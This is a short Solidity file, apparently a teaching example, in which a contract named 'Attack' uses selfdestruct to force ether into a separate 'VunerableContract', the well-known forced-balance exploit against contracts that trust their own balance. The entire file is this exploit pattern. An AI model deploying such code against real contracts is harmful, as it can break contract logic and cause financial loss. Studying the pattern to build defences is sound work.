// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract Attack {
    VunerableContract VC;

    constructor(VunerableContract _address) {
        VC = VunerableContract(_address);
    }

    function attack() public payable {
        address payable addr = payable(address(VC));
        selfdestruct(addr);
    }

    receive() external payable {}
    fallback() external payable {}

}
